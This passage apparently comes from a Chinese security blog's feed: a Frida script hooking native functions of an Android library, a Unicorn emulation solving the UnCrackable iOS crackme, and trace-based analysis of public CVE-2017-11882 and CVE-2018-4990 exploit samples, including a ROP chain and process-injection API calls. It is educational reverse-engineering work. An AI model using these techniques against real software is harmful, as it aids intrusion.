class="line">    var sub_12B44 = libjni_base.add(0x12B44);</span><br><span class="line">    Interceptor.attach(sub_12B44,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            console.log(&quot;sub_12B44 onEnter: arg1=&quot;,ptr(this.arg1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_12B44 onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            //console.log(&quot;sub_12B44 onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1391C = libjni_base.add(0x1391C);</span><br><span class="line">    Interceptor.attach(sub_1391C,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            //console.log(&quot;sub_1391C onEnter: arg1=&quot;,ptr(this.arg1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_1391C onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            //console.log(&quot;sub_1391C onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_18D30 = libjni_base.add(0x18D30);</span><br><span class="line">    Interceptor.attach(sub_18D30,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            this.arg3 = args[2];</span><br><span class="line">            console.log(&quot;sub_18D30 onEnter: arg1=&quot;,ptr(this.arg1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_18D30 onLeave: retval=&quot;,hexdump(retval));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_18AB0 = libjni_base.add(0x18AB0);</span><br><span class="line">    Interceptor.attach(sub_18AB0,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            this.x8 = this.context.x8;</span><br><span class="line">            //方法的返回值一般都在 x0 上；如果方法返回值是一个较大的数据结构时，结果会存在 x8 执行的地址上。</span><br><span class="line">            //如果打印X0没有结果，可以看汇编查看是否是X8存储的结果（jstring结构体+0x10指针）</span><br><span class="line">            console.log(&quot;sub_18AB0 onEnter: arg1=&quot;,ptr(this.arg1).add(1).readCString(),&quot;arg2=&quot;,ptr(this.arg2).add(1).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            //console.log(&quot;sub_18AB0 onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            console.log(&quot;sub_18AB0 onLeave: retx8 =&quot;,hexdump(ptr(this.x8).add(Process.pointerSize*2).readPointer()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_12CF4 = libjni_base.add(0x12CF4);</span><br><span class="line">    Interceptor.attach(sub_12CF4,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            console.log(&quot;sub_12CF4 onEnter: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_12CF4 onLeave: arg1=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">            //console.log(&quot;sub_12CF4 onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    var sub_16900 = libjni_base.add(0x16900);</span><br><span class="line">    Interceptor.attach(sub_16900,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg1 = args[0];</span><br><span class="line">            this.arg2 = args[1];</span><br><span class="line">            this.arg3 = args[2];</span><br><span class="line">            console.log(&quot;sub_16900 onEnter: arg1=&quot;,ptr(this.arg1).readCString());</span><br><span class="line">            console.log(&quot;sub_16900 onEnter: arg2=&quot;,this.arg2);</span><br><span class="line">            console.log(&quot;sub_16900 onEnter: arg3=&quot;,ptr(this.arg3).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_16900 onLeave: arg1=&quot;,ptr(this.arg1).readCString());</span><br><span class="line">            console.log(&quot;sub_16900 onLeave: arg2=&quot;,this.arg2);</span><br><span class="line">            console.log(&quot;sub_16900 onLeave: arg3=&quot;,hexdump(this.arg3));</span><br><span class="line">            //console.log(&quot;sub_16900 onLeave: ret =&quot;,ptr(retval).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java()</span><br><span class="line">    hook_native()</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<h2 id="L7：Frida-辅助分析非标准算法"><a href="#L7：Frida-辅助分析非标准算法" class="headerlink" title="L7：Frida 辅助分析非标准算法"></a>L7：Frida 辅助分析非标准算法</h2><h2 id="L8：IDA-Trace-辅助分析非标准算法"><a href="#L8：IDA-Trace-辅助分析非标准算法" class="headerlink" title="L8：IDA Trace 辅助分析非标准算法"></a>L8：IDA Trace 辅助分析非标准算法</h2><h2 id="L9：IDA-Trace辅助分析OOLVM混淆的非标准算法"><a href="#L9：IDA-Trace辅助分析OOLVM混淆的非标准算法" class="headerlink" title="L9：IDA Trace辅助分析OOLVM混淆的非标准算法"></a>L9：IDA Trace辅助分析OOLVM混淆的非标准算法</h2><p>后面三课的内容涉及的Frida用法不多，而且之前也都已经涉及到，后面有空了连同上一篇补充下细节。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol>
<li>个人感觉Frida辅助分析OLLVM主要在于运行时HOOK获取到解密后的字符串，以及通过交叉引用获取到程序的参数。</li>
</ol>
<p>附件下载：<a href="samples.zip" target="_blank">链接</a></p>
]]></content>
      <categories>
        <category>移动终端</category>
      </categories>
      <tags>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-03-01-使用Unicorn模拟运行破解简单的IOS-IPA-Crackme</title>
    <url>/2021/03/01/2021-03-01-%E4%BD%BF%E7%94%A8Unicorn%E6%A8%A1%E6%8B%9F%E8%BF%90%E8%A1%8C%E7%A0%B4%E8%A7%A3%E7%AE%80%E5%8D%95%E7%9A%84IOS-IPA-Crackme/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;IPA是Apple程序应用文件iPhoneApplication的缩写。苹果手机上ios系统上安装开发的app，首先要将项目打包成ipa文件。利用IDA静态分析以及Unicorn的模拟执行功能，可以在没有ios调试环境的情况下对ios app开展静态分析以及模拟动态执行工作。
</blockquote>
<a id="more"></a>
<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>UnCrackable_Level1.ipa 为需要分析的目标程序，位置为测试虚拟机环境中的桌面文件夹，同目录下的wp文件夹中存放实验用的wp脚本。</p>
<ol>
<li>首先根据ipa包的文件格式获取其主程序文件，选择使用Winrar对ipa包进行解压，将其解压到默认桌面文件夹。</li>
</ol>
<div align="center">

<p><img src="1.png" alt="1"></p>
</div>
得到Payload\UnCrackable Level 1.app目录中的主程序文件“UnCrackable Level 1”。

<ol start="2">
<li>使用桌面中的IDA程序打开“UnCrackable Level 1”，打开方式选择Math-O(arm64)方式。<div align="center">

</li>
</ol>
<p><img src="2.png" alt="2"></p>
</div>

<ol start="3">
<li><p>根据IDA识别的按钮点击事件的处理流程，可以定位到Flag字符串的处理函数。</p>
<div align="center">

<p><img src="3.png" alt="3"></p>
</div>
也可以通过字符串搜索方式定位到Flag的验证处理流程：
<div align="center">

<p><img src="4.png" alt="4"></p>
</div>
利用引用地址同样定位到buttonclick处理函数代码：
<div align="center">

<p><img src="5.png" alt="5"></p>
</div>
</li>
<li><p>下面继续分析该函数的处理流程，使用F5获取伪代码显示。</p>
<div align="center">

<p><img src="6.png" alt="6">    </p>
</div>
分析处理流程为输入框中输入的Flag字符串与thelabel标签标识的字符串相比较，比较相等成功之后则弹出Flag验证正确的提示。
</li>
<li><p>实际上程序运行后是无法看到thelabel标签标识的字符串的，需要跟进程序中视图加载时对该标签的处理过程查看到标签实际的字符串值。使用IDA查看viewDidLoad函数的代码：</p>
<div align="center">

<p><img src="7.png" alt="7"></p>
</div>
可以看到thelabel标签的字符串值实际上是由sub_1000080D4函数处理后返回.同时可以看到程序中设置该标签为隐藏属性.
</li>
<li><p>跟进分析sub_1000080D4函数的实现过程。</p>
<div align="center">

<p><img src="8.png" alt="8"></p>
</div>
该函数功能为对字符串缓冲区逐字节进行运算赋值,最终返回运算完之后的字符串.
</li>
<li><p>因为直接通过静态分析得到最终返回的字符串值较为复杂,可以考虑使用Unicorn模拟执行的方式对sub_1000080D4函数进行仿真,并获取其最终返回的字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding=utf8</span><br><span class="line">from unicorn import *</span><br><span class="line">from unicorn.arm64_const import *</span><br><span class="line"></span><br><span class="line">ImageBase = 0x0</span><br><span class="line">ImageSize = 0x100000</span><br><span class="line">StackBase = 0x200000</span><br><span class="line">StackSize = 0x100000</span><br><span class="line">StackTop = StackBase + StackSize - 0x10</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    mu = Uc(UC_ARCH_ARM64,UC_MODE_ARM)</span><br><span class="line">    mu.mem_map(ImageBase,ImageSize)</span><br><span class="line">    bin = open(&quot;UnCrackable Level 1&quot;,&quot;rb&quot;).read()</span><br><span class="line">    mu.mem_write(ImageBase,bin)</span><br><span class="line"></span><br><span class="line">    mu.mem_map(StackBase,StackSize)</span><br><span class="line">    mu.reg_write(UC_ARM64_REG_SP,StackTop)</span><br><span class="line"></span><br><span class="line">    target_begin = ImageBase + 0x240D4</span><br><span class="line">    target_end = ImageBase + 0x24154</span><br><span class="line">    mu.emu_start(target_begin,target_end)</span><br><span class="line">    print(&quot;Done...&quot;)</span><br><span class="line"></span><br><span class="line">    x0 = mu.reg_read(UC_ARM64_REG_X0)</span><br><span class="line">    result = mu.mem_read(x0,16)</span><br><span class="line">    print(&apos;Flag:&apos; + result.decode(&apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">except UcError as e:</span><br><span class="line">    print(&quot;ERROR:%s&quot; %e)</span><br></pre></td></tr></table></figure>
<p>该段代码的主要功能为利用Unicorn申请代码缓存及栈空间,对指定的sub_1000080D4函数代码起始位置(0x240D4)和结束位置(0x24154)进行仿真,最终取回返回值也即是寄存器X0指向的内存空间.注意因为镜像申请的空间为自定义的基地址0,代码实际所在的位置需要进行确认,</p>
<div align="center">

<p><img src="9.png" alt="9"></p>
</div></li>
<li><p>将”UnCrackable Level 1”文件拷贝到wp脚本所在目录,并执行wp脚本获取返回字符串值,即为Flag字符串.</p>
<div align="center">

<p><img src="10.png" alt="10"></p>
</div>

</li>
</ol>
<h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>ios ipa逆向基础知识以及Unicorn框架的使用方法。</p>
]]></content>
      <categories>
        <category>移动终端</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-06-06-hutrace工具系列第2篇之Windows应用</title>
    <url>/2022/06/06/2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/1.png" alt=""></p>
<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;上一篇主要介绍hutrace的各个看着花里胡哨的功能，这里结合一些漏洞、样本的实例进行分析，日常工作见到的一些测试用例不方便公开，很多程序来自网上搜集，演示效果还不够好，而且本文主要目的是介绍hutrace功能用于辅助分析，对于用例的漏洞成因等不再介绍，暂时也确实没足够精力深入分析这些测试样例，网上也已经有比较多的文章了。。
</blockquote>
<a id="more"></a>

<h2 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1. 漏洞分析"></a>1. 漏洞分析</h2><p>介绍几个简单的漏洞Exp分析示例，演示hutrace在实战中的应用，漏洞成因暂不做更为深入分析，找的漏洞的例子其实不太多，像一些有符号信息程序或者可自己编译源码的如ie系列、chrome等浏览器程序，虽然可以使用脚本对hutrace的日志中地址的符号信息进行标注，但这样操作反而有点问题搞的复杂化，最差的情况下可以把hutrace的运行日志当作参照物掌握其执行流程，不用调试回溯即可反向定位到之前执行的代码流程。</p>
<h3 id="1-1-CVE-2017-11882-office公式编辑器漏洞分析"><a href="#1-1-CVE-2017-11882-office公式编辑器漏洞分析" class="headerlink" title="1.1 CVE-2017-11882  office公式编辑器漏洞分析"></a>1.1 CVE-2017-11882  office公式编辑器漏洞分析</h3><p>样本来源：<a href="https://github.com/unamer/CVE-2017-11882" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882</a> </p>
<p>shellcode功能为重新创建一个傀儡进程EQNEDT32.EXE进程并注入、释放并执行一个3k大小的弹框程序。win7x32+office2010测试环境，执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\Desktop\bin&gt;drconfig.exe -reg EQNEDT32.EXE -syswide_on -c hutracelib.dll -only_from_app -print_ret_addr -print_ins_info -logdir C:\Users\admin\Desktop\bin\ -config C:\Users\admin\Desktop\bin\hutrace.config</span><br><span class="line">WARNING: on Windows 7+, syswide_on relaxes system security by removing certain code signing requirements</span><br></pre></td></tr></table></figure>
<p>这里没有使用之前hutrace.exe直接启动Word程序，因为公式编辑器进程EQNEDT32.EXE是通过RPC方式启动，而dynamorio的追踪子进程功能只能捕捉默认的CreateProcess等方式启动的子进程，独立的EQNEDT32.EXE进程无法追踪，但是可以使用dynamorio的自动附加功能，使用dynamorio中自带的drconfig.exe为EQNEDT32.EXE进程注册启动时自动注入dynamorio插件。</p>
<p>下面直接在测试环境使用word打开test.rtf文件，日志目录中生成的文件中我们只需要关注下面三个：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/2.png" alt=""></p>
<p>其中前两个是Shellcode执行记录的情况，而创建的傀儡进程EQNEDT32.EXE的trace日志文件huhu.EQNEDT32.EXE.02120.0000.log文件内容（从LoadlibraryA函数开始其实进程已经执行完主题功能，后面未严格处理漏洞现场环境导致进程崩溃退出了，msappid.exe功能简单只有一个弹框）：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/3.png" alt=""></p>
<p>Shellcode功能一览无遗，也比较简单，下面主要根据日志分析漏洞执行情况，搜索API执行情况，直接从trace的日志中API调用结果的最后开始向前追溯：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//省略部分010edit搜索的结果</span><br><span class="line">Line 250203	8h	~~696~~ KERNEL32.dll!GlobalLock N:0x187d</span><br><span class="line">Line 250210	8h	~~696~~ KERNEL32.dll!GlobalUnlock N:0x187e</span><br><span class="line">Line 250227	8h	~~696~~ KERNEL32.dll!GlobalLock N:0x187f</span><br><span class="line">Line 250234	8h	~~696~~ KERNEL32.dll!GlobalUnlock N:0x1880</span><br><span class="line">Line 250622	8h	~~696~~ KERNEL32.dll!CreateProcessA N:0x1881  &lt;-------------这里</span><br><span class="line">Line 250664	8h	~~696~~ KERNEL32.dll!WaitForDebugEvent N:0x1882</span><br><span class="line">Line 250701	8h	~~696~~ KERNEL32.dll!GetThreadContext N:0x1883</span><br><span class="line">Line 250719	8h	~~696~~ KERNEL32.dll!VirtualProtectEx N:0x1884</span><br><span class="line">Line 250725	8h	~~696~~ KERNELBASE.dll!VirtualProtectEx N:0x1885</span><br><span class="line">Line 250770	8h	~~696~~ KERNEL32.dll!WriteProcessMemory N:0x1886</span><br><span class="line">Line 250776	8h	~~696~~ KERNELBASE.dll!WriteProcessMemory N:0x1887</span><br><span class="line">Line 250797	8h	~~696~~ KERNEL32.dll!SetThreadContext N:0x1888</span><br><span class="line">Line 250809	8h	~~696~~ KERNEL32.dll!DebugSetProcessKillOnExit N:0x1889</span><br><span class="line">Line 250822	8h	~~696~~ KERNEL32.dll!ContinueDebugEvent N:0x188a</span><br><span class="line">Line 250835	8h	~~696~~ KERNEL32.dll!DebugActiveProcessStop N:0x188b</span><br><span class="line">Line 250846	8h	~~696~~ KERNEL32.dll!ExitProcess N:0x188c</span><br></pre></td></tr></table></figure>
<p>很明显漏洞触发后最先执行的既是CreateProcessA函数，双击定位到相应的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     lea    eax, [esp+0x30]</span><br><span class="line">     mov    dword ptr [esp+0x30], 0x454e5145</span><br><span class="line">     push   eax</span><br><span class="line">     push   edx</span><br><span class="line">     mov    dword ptr [esp+0x3c], 0x32335444</span><br><span class="line">     mov    dword ptr [esp+0x40], 0x4558452e</span><br><span class="line">     mov    byte ptr [esp+0x44], dl</span><br><span class="line">     call   ebx</span><br><span class="line">I6c6af6|77de2062</span><br><span class="line">~~696~~ KERNEL32.dll!CreateProcessA N:0x1881</span><br><span class="line">    arg 0: &lt;null&gt; (type=char*, size=0x0)</span><br><span class="line">    arg 1: EQNEDT32.EXE (type=char*, size=0x0)</span><br><span class="line">    arg 2: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line">    arg 3: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line">    arg 4: 0x0 (type=BOOL, size=0x4)</span><br><span class="line">    arg 5: 0x2 (type=DWORD, size=0x4)</span><br><span class="line"> and return to addr:0x6c6af8</span><br></pre></td></tr></table></figure>
<p>继续往上翻代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">411870:</span><br><span class="line">     pop    edi</span><br><span class="line">     pop    esi</span><br><span class="line">     pop    ebx</span><br><span class="line">     leave</span><br><span class="line">     ret</span><br><span class="line">R411874|402114              &lt;-------------这里</span><br><span class="line">402114:</span><br><span class="line">     ret                    &lt;-------------这里</span><br><span class="line">R402114|12f350              &lt;-------------这里</span><br><span class="line">12f350:</span><br><span class="line">     mov    eax, 0x1271eb44</span><br><span class="line">     mov    edx, 0x12345678</span><br><span class="line">     xor    eax, edx</span><br><span class="line">     mov    ecx, dword ptr [eax]</span><br><span class="line">     mov    ecx, dword ptr [ecx]</span><br><span class="line">     mov    ecx, dword ptr [ecx]</span><br><span class="line">     add    cx, 0x3c</span><br><span class="line">     jmp    ecx</span><br><span class="line">J12f366|6c6974</span><br><span class="line">6c6974:</span><br><span class="line">     push   ebp</span><br><span class="line">     mov    ebp, esp</span><br><span class="line">     and    esp, 0xf8</span><br><span class="line">     sub    esp, 0x000003c4</span><br></pre></td></tr></table></figure>
<p>这不明显就是溢出覆盖的返回地址嘛~有的Shellcode可能会故意清除已执行代码或者栈结构，有了trace记录则不会受这种情况影响，到了这里如果结合IDA可以很容易定位溢出位置，如果继续查看该日志文件可能信息不是很大了，而且溢出位置之前的部分代码并非第一次执行，所以trace的日志里不再打印实际的汇编指令，后面继续分析，不使用IDA非要找虐的话，也可以使用hutrace的print_ins_reg功能打印所有执行指令以及指令状态信息，把上面执行的命令print_ins_info替换为print_ins_reg再次执行trace过程，这样的trace过程就比较慢了，两分钟生成了约500兆的接近全部运行状态的日志文件（注意还不是全部状态哦，只是指令引用的寄存器及内存状态信息，不过大部分情况已经足够了），虽然运行效率低点，好消息是不用像TTD等工具那样反复重放操作了，如果结合IDA的话可以在对处理流程更了解的基础上，设置只处理trace的起始地址，划分关注的代码这样trace的效率更高。</p>
<p>我们下面演示不用调试器、IDA分析的情况下，利用无脑全流程trace的方式分析该漏洞，通过记录的指令指令状态信息定位溢出点，首先根据溢出覆盖的返回地址信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I0x411874|ret                                             	|	esp:0x12f1d0</span><br><span class="line">I0x402114|ret                                             	|	esp:0x12f1d4</span><br></pre></td></tr></table></figure>
<p>日志文件中搜索0x12f1d0：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/4.png" alt=""></p>
<p>看到图中左侧框中的数据变化规律可以看出在循环处理栈中的数据，继续往上翻日志：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/5.png" alt=""></p>
<p>这不就找到溢出点位置了，后面可以再据此根据rtf文件结构、shellcode在rtf中的位置、搜索rtf数据在trace日志文件中的处理流程等等，探究漏洞成因，结合IDA的话其实基本也可以做到不用调试就能澄清漏洞细节了，这里我就不继续了。。。</p>
<ul>
<li>补充说明<br>使用drconfig.exe方式在程序启动时自动注入dynamorio插件默认是追踪msappid.exe子进程的，且对msappid.exe子进程来说设置的trace运行参数是一致的，如果想对子进程设置不同的trace参数，可以设置“ -ops “-no_follow_children””参数，然后再使用drconfig.exe再对msappid.exe子进程注册并设置trace参数。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drconfig.exe -reg EQNEDT32.EXE -syswide_on -ops &quot;-no_follow_children&quot; -c hutracelib.dll -only_from_app -print_ret_addr -print_ins_info -logdir C:\Users\admin\Desktop\bin\ -config C:\Users\admin\Desktop\bin\hutrace.config</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="1-2-CVE-2018-4990-adobe-pdf-漏洞载荷分析"><a href="#1-2-CVE-2018-4990-adobe-pdf-漏洞载荷分析" class="headerlink" title="1.2 CVE-2018-4990 adobe pdf 漏洞载荷分析"></a>1.2 CVE-2018-4990 adobe pdf 漏洞载荷分析</h3><p>继续搞个pdf的洞简单分析下，首先关闭Adobe的沙盒保护：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC2%E7%AF%87%E4%B9%8BWindows%E5%BA%94%E7%94%A8/6.png" alt=""></p>
<p>不会影响漏洞触发，但是开启该机制会影响hutrace的trace操作，关闭之后执行下述命令指定对漏洞模块EScript.api的追踪：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\Desktop\bin&gt;hutrace.exe  -only_from_app  -print_ret_addr  -print_ins_info -trace_to_librarys EScript.api -- &quot;C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe&quot; C:\Users\admin\Desktop\CVE-2018-4990-modify.pdf</span><br></pre></td></tr></table></figure>
<p>漏洞的Shellcode为一个简单的MessagexBox弹框，大概三分钟的时间形成了近20个记录的线程日志，其中最大的日志文件约1.9G，这还不包含寄存器等状态信息，首先搜索其API执行情况，从后往前查看或者直接搜索MessageBox：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//010edit搜索的部分结果</span><br><span class="line">Line 102653393	9h	~~3600~~ MSVCR120.dll!strcmp N:0x10533a</span><br><span class="line">Line 102653416	9h	~~3600~~ MSVCR120.dll!strcmp N:0x10533b</span><br><span class="line">Line 102653435	9h	~~3600~~ MSVCR120.dll!strcmp N:0x10533c</span><br><span class="line">Line 102653516	9h	~~3600~~ KERNEL32.dll!VirtualAlloc N:0x10533d</span><br><span class="line">Line 102653522	9h	~~3600~~ KERNELBASE.dll!VirtualAlloc N:0x10533e</span><br><span class="line">Line 102653597	9h	~~3600~~ KERNEL32.dll!GetProcAddress N:0x10533f</span><br><span class="line">Line 102653601	9h	~~3600~~ KERNELBASE.dll!GetProcAddress N:0x105340</span><br><span class="line">Line 102653616	9h	~~3600~~ KERNEL32.dll!LoadLibraryA N:0x105341</span><br><span class="line">Line 102653631	9h	~~3600~~ KERNEL32.dll!GetProcAddress N:0x105342</span><br><span class="line">Line 102653635	9h	~~3600~~ KERNELBASE.dll!GetProcAddress N:0x105343</span><br><span class="line">Line 102653654	9h	~~3600~~ USER32.dll!MessageBoxA N:0x105344</span><br><span class="line">Line 102653672	9h	~~3600~~ KERNEL32.dll!GetProcAddress N:0x105345</span><br><span class="line">Line 102653676	9h	~~3600~~ KERNELBASE.dll!GetProcAddress N:0x105346</span><br><span class="line">Line 102653686	9h	~~3600~~ KERNEL32.dll!ExitProcess N:0x105347</span><br><span class="line">Line 102653728	9h	~~3600~~ ntdll.dll!RtlEnterCriticalSection N:0x105348</span><br></pre></td></tr></table></figure>
<p>查看VirtualAlloc函数附近的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R23802a02|2383af18</span><br><span class="line">R2383af18|23861a4e</span><br><span class="line">R23861a5d|23858051</span><br><span class="line">R2385806e|238c18e9</span><br><span class="line">I238c18f4|23929f00</span><br><span class="line">23929f00:</span><br><span class="line">     xchg   esp, eax</span><br><span class="line">     ret</span><br><span class="line">R23929f01|238c7e76</span><br><span class="line">238c7e76:</span><br><span class="line">     pop    esp</span><br><span class="line">     pop    ecx</span><br><span class="line">     pop    ecx</span><br><span class="line">     pop    ebp</span><br><span class="line">     ret    0x0004</span><br><span class="line">R238c7e7a|23882803</span><br><span class="line">23882803:</span><br><span class="line">     ret</span><br><span class="line">R23882803|23882802</span><br><span class="line">23882802:</span><br><span class="line">     pop    ecx</span><br><span class="line">     ret</span><br><span class="line">R23882803|23811784</span><br><span class="line">R23811786|2398af26</span><br><span class="line">2398af26:</span><br><span class="line">     xchg   esi, eax</span><br><span class="line">     ret</span><br><span class="line">R2398af27|23818000</span><br><span class="line">23818000:</span><br><span class="line">     pop    ebp</span><br><span class="line">     ret</span><br><span class="line">R23818001|2390f282</span><br><span class="line">2390f282:</span><br><span class="line">     pop    ebx</span><br><span class="line">     ret</span><br><span class="line">R2390f283|23882802</span><br><span class="line">R23882803|238095c3</span><br><span class="line">238095c3:</span><br><span class="line">     pop    edi</span><br><span class="line">     ret</span><br><span class="line">R238095c4|2395b084</span><br><span class="line">2395b084:</span><br><span class="line">     pop    edx</span><br><span class="line">     ret</span><br><span class="line">R2395b085|23978e07</span><br><span class="line">23978e07:</span><br><span class="line">     pop    eax</span><br><span class="line">     ret</span><br><span class="line">R23978e08|23841ec9</span><br><span class="line">23841ec9:</span><br><span class="line">     pushad</span><br><span class="line">     ret</span><br><span class="line">R23841eca|238095c4</span><br><span class="line">238095c4:</span><br><span class="line">     ret</span><br><span class="line">R238095c4|77e305f4</span><br><span class="line">~~3600~~ KERNEL32.dll!VirtualAlloc N:0x10533d</span><br><span class="line">    arg 0: 0x0d1300b0 =&gt; 0x00000000 (type=void*, size=0x0)</span><br><span class="line">    arg 1: 0x10201 (type=size_t, size=0x4)</span><br><span class="line">    arg 2: 0x1000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 3: 0x40 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:54, retraddr: 0x23823aaa,offset:0x23aaa</span><br><span class="line">~~3600~~ KERNELBASE.dll!VirtualAlloc N:0x10533e</span><br><span class="line">    arg 0: 0x0d1300b0 =&gt; 0x00000000 (type=void*, size=0x0)</span><br><span class="line">    arg 1: 0x10201 (type=size_t, size=0x4)</span><br><span class="line">    arg 2: 0x1000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 3: 0x40 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:54, retraddr: 0x23823aaa,offset:0x23aaa</span><br><span class="line">23823aaa:</span><br><span class="line">     jmp    esp</span><br><span class="line">J23823aaa|d1300ac</span><br><span class="line"> and VirtualAlloc return value:  0xd130000 </span><br><span class="line"> and VirtualAlloc return value:  0xd130000 </span><br><span class="line">d1300ac:</span><br><span class="line">     add    byte ptr [eax], al</span><br><span class="line">     add    byte ptr [eax], al</span><br><span class="line">     nop</span><br><span class="line">     nop</span><br><span class="line">     nop</span><br></pre></td></tr></table></figure>
